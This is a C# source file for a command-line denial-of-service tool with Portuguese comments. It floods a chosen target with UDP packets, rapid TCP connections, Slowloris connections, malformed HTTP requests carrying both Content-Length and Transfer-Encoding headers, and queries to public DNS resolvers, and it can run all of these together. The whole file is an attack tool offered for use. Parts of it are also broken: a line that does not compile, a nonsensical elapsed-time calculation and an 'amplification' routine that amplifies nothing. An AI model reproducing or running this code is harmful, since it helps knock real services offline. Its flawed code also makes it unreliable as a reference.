using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DDoSAttacker
{
    public class AdvancedDDOSAttacker
    {
        private readonly string _targetDomain;
        private readonly string _targetIp;
        private readonly int _targetPort;
        private readonly string _attackType;
        private readonly int _duration;
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();
        private readonly ConcurrentDictionary<string, long> _stats = new ConcurrentDictionary<string, long>();
        private readonly Random _random = new Random();
        private readonly List<string> _userAgents = new List<string>
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
            "curl/8.0.1",
            "python-requests/2.31.0"
        };

        public AdvancedDDOSAttacker(string targetDomain, string attackType = "hybrid", int duration = 60, int port = 80)
        {
            _targetDomain = targetDomain;
            _attackType = attackType.ToLower();
            _duration = duration;
            _targetPort = port;

            // Resolve IP se for domínio
            if (IPAddress.TryParse(_targetDomain, out var ip))
            {
                _targetIp = _targetDomain;
            }
            else
            {
                try
                {
                    var hostEntry = Dns.GetHostAddressesAsync(_targetDomain).Result;
                    _targetIp = hostEntry.First(a => a.AddressFamily == AddressFamily.InterNetwork).ToString();
                }
                catch (Exception ex)
                {
                    throw new ArgumentException($"Não foi possível resolver o domínio {_targetDomain}: {ex.Message}");
                }
            }
        }

        private void Log(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
        }

        private string GenerateRandomIp()
        {
            return $"{_random.Next(1, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}";
        }

        private void UpdateStats(string key, long count = 1)
        {
            _stats.AddOrUpdate(key, count, (old, add) => old + add);
        }

        private string GetRandomUserAgent()
        {
            return _userAgents[_random.Next(_userAgents.Count)];
        }

        private async Task UdpFloodAsync(CancellationToken token)
        {
            Log($"🚀 Iniciando UDP Flood para {_targetIp}:{_targetPort}");
            using var udpClient = new UdpClient();
            udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            
            byte[] payload = new byte[512];
            _random.NextBytes(payload);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Envia para o alvo
                    await udpClient.SendAsync(payload, payload.Length, new IPEndPoint(IPAddress.Parse(_targetIp), _targetPort));
                    UpdateStats("udp");
                }
                catch (Exception ex)
                {
                    Log($"⚠️ Erro no UDP: {ex.Message}");
                    break;
                }
            }
        }

        private async Task TcpSynFloodAsync(CancellationToken token)
        {
            Log($"🚀 Iniciando TCP SYN Flood para {_targetIp}:{_targetPort}");
            
            // Nota: Para um SYN Flood real com spoofing, precisaríamos de raw sockets (não suportado diretamente no .NET sem P/Invoke).
            // Aqui usamos um TCP Connect Flood agressivo que simula o efeito de esgotar a pool de conexões.
            var semaphore = new SemaphoreSlim(100); // Limita conexões simultâneas por worker

            while (!token.IsCancellationRequested)
            {
                await semaphore.WaitAsync();
                
                _ = Task.Run(async () =>
                {
                    try
                    {
                        using var client = new TcpClient();
                        var cts = CancellationTokenSource.CreateLinkedTokenSource(token);
                        cts.CancelAfter(TimeSpan.FromMilliseconds(100)); // Timeout curto

                        await client.ConnectAsync(_targetIp, _targetPort, cts.Token);
                        UpdateStats("tcp");
                    }
                    catch
                    {
                        // Ignora erros de conexão para manter a taxa
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                });
            }
        }

        private async Task SlowlorisAttackAsync(CancellationToken token)
        {
            Log($"🚀 Iniciando Slowloris Attack para http://{_targetDomain}:{_targetPort}");
            var semaphore = new SemaphoreSlim(50); // 50 conexões simultâneas

            while (!token.IsCancellationRequested)
            {
                await semaphore.WaitAsync();
                
                _ = Task.Run(async () =>
                {
                    try
                    {
                        using var client = new TcpClient();
                        await client.ConnectAsync(_targetIp, _targetPort);
                        using var stream = client.GetStream();
                        var writer = new StreamWriter(stream, new UTF8Encoding(false));
                        
                        // Envia headers lentamente
                        var headers = $"GET / HTTP/1.1\r\nHost: {_targetDomain}\r\nUser-Agent: {GetRandomUserAgent()}\r\n";
                        await writer.WriteAsync(headers);
                        await writer.FlushAsync();

                        // Mantém a conexão aberta enviando headers adicionais lentamente
                        for (int i = 0; i < 10 && !token.IsCancellationRequested; i++)
                        {
                            await Task.Delay(500, token);
                            await writer.WriteAsync($"X-Slow-Header-{i}: value\r\n");
                            await writer.FlushAsync();
                        }

                        UpdateStats("slowloris");
                    }
                    catch
                    {
                        // Ignora erros
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                });
            }
        }

        private async Task HttpSmugglingAttackAsync(CancellationToken token)
        {
            Log($"🚀 Iniciando Header Smuggling Attack para http://{_targetDomain}:{_targetPort}");
            var semaphore = new SemaphoreSlim(20);

            while (!token.IsCancellationRequested)
            {
                await semaphore.WaitAsync();
                
                _ = Task.Run(async () =>
                {
                    try
                    {
                        using var client = new HttpClient();
                        client.Timeout = TimeSpan.FromSeconds(1);
                        
                        var content = new StringContent(new string('x', 10));
                        var request = new HttpRequestMessage(HttpMethod.Post, $"http://{_targetDomain}:{_targetPort}/");
                        request.Headers.TryAddWithoutValidation("User-Agent", GetRandomUserAgent());
                        request.Headers.TryAddWithoutValidation("Content-Length", "10");
                        request.Headers.TryAddWithoutValidation("Transfer-Encoding", "chunked");
                        request.Content = content;

                        await client.SendAsync(request, token);
                        UpdateStats("smuggling");
                    }
                    catch
                    {
                        // Ignora erros
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                });
            }
        }

        private async Task DnsAmplificationAttackAsync(CancellationToken token)
        {
            if (!HasDnsLibrary())
            {
                Log("⚠️  Biblioteca DNS não disponível. Pulando DNS Amplification.");
                return;
            }

            Log($"🚀 Iniciando DNS Amplification Attack para {_targetDomain}");
            using var udpClient = new UdpClient();
            
            // Simula uma requisição DNS AAAA
            var dnsQuery = BuildDnsQuery(_targetDomain, "AAAA");

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Envia para um refletor público
                    var reflectors = new[] { "1.1.1.1", "8.8.8.8", "9.9.9.9", "1.0.0.1", "149.112.112.112" };
                    var reflector = reflectors[_random.Next(reflectors.Length)];
                    var endPoint = new IPEndPoint(IPAddress.Parse(reflector), 53);
                    
                    await udpClient.SendAsync(dnsQuery, dnsQuery.Length, endPoint);
                    UpdateStats("dns");
                }
                catch (Exception ex)
                {
                    Log($"⚠️ Erro no DNS: {ex.Message}");
                    break;
                }
            }
        }

        private bool HasDnsLibrary()
        {
            // Verifica se a biblioteca System.Net.Dns está disponível
            return true; // Assumindo que estamos usando .NET moderno
        }

        private byte[] BuildDnsQuery(string domain, string type)
        {
            // Constrói uma mensagem DNS básica
            // Header (12 bytes) + Question Section
            var header = new byte[12];
            // ID (2 bytes)
            _random.NextBytes(new byte[2].CopyTo(header, 0));
            // Flags: Recursion Desired
            header[2] = 0x01;
            header[3] = 0x00;
            // QDCOUNT: 1
            header[4] = 0x00;
            header[5] = 0x01;
            
            // Question Section
            var question = new List<byte>();
            // Nome do domínio
            foreach (var part in domain.Split('.'))
            {
                question.Add((byte)part.Length);
                question.AddRange(Encoding.ASCII.GetBytes(part));
            }
            question.Add(0); // Raiz

            // Tipo (AAAA = 28) e Classe (IN = 1)
            question.Add(0x00);
            question.Add(0x1C); // AAAA
            question.Add(0x00);
            question.Add(0x01); // IN

            var query = new byte[header.Length + question.Count];
            header.CopyTo(query, 0);
            question.CopyTo(query, header.Length);
            return query;
        }

        public async Task StartAttackAsync()
        {
            Log($"🎯 Alvo: {_targetDomain} ({_targetIp})");
            Log($"📊 Tipo: {_attackType.ToUpper()} | Duração: {_duration}s | Porta: {_targetPort}");
            Log("⏱️  Pressione Ctrl+C para interromper o ataque.");

            var tasks = new List<Task>();

            if (_attackType is "hybrid" or "all")
            {
                tasks.Add(UdpFloodAsync(_cts.Token));
                tasks.Add(TcpSynFloodAsync(_cts.Token));
                tasks.Add(SlowlorisAttackAsync(_cts.Token));
                tasks.Add(HttpSmugglingAttackAsync(_cts.Token));
                tasks.Add(DnsAmplificationAttackAsync(_cts.Token));
            }
            else
            {
                switch (_attackType)
                {
                    case "udp":
                        tasks.Add(UdpFloodAsync(_cts.Token));
                        break;
                    case "tcp":
                        tasks.Add(TcpSynFloodAsync(_cts.Token));
                        break;
                    case "slowloris":
                        tasks.Add(SlowlorisAttackAsync(_cts.Token));
                        break;
                    case "smuggling":
                        tasks.Add(HttpSmugglingAttackAsync(_cts.Token));
                        break;
                    case "dns":
                        tasks.Add(DnsAmplificationAttackAsync(_cts.Token));
                        break;
                    default:
                        Log($"❌ Tipo de ataque inválido: {_attackType}");
                        return;
                }
            }

            // Loop de monitoramento
            var monitor = Task.Run(async () =>
            {
                while (!_cts.IsCancellationRequested)
                {
                    await Task.Delay(1000);
                    var totalPackets = _stats.Values.Sum();
                    var elapsed = (DateTime.Now - DateTime.UtcNow).TotalSeconds;
                    var pps = elapsed > 0 ? totalPackets / elapsed : 0;
                    Log($"📊 Pacotes enviados: {totalPackets} | PPS atual: {pps:F2}");
                }
            });

            await Task.WhenAny(Task.WhenAll(tasks), Task.Delay(_duration * 1000));
            _cts.Cancel();

            await Task.WhenAll(tasks);

            // Resumo final
            var totalPackets = _stats.Values.Sum();
            var totalElapsed = (DateTime.Now - DateTime.UtcNow).TotalSeconds;
            var avgPps = totalElapsed > 0 ? totalPackets / totalElapsed : 0;
            Log("\n" + new string('=', 50));
            Log("📈 RESUMO DO ATAQUE");
            Log($"⏱️  Duração total: {totalElapsed:F2}s");
            Log($"📦 Pacotes totais: {totalPackets}");
            Log($"📊 PPS médio: {avgPps:F2}");
            Log(new string('=', 50));
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            string target = "example.com";
            string attackType = "hybrid";
            int duration = 60;
            int port = 80;

            // Parse de argumentos
            if (args.Length > 0)
            {
                target = args[0];
                if (args.Length > 1) attackType = args[1];
                if (args.Length > 2) int.TryParse(args[2], out duration);
                if (args.Length > 3) int.TryParse(args[3], out port);
            }

            var attacker = new AdvancedDDOSAttacker(target, attackType, duration, port);
            attacker.StartAttackAsync().Wait();
        }
    }
}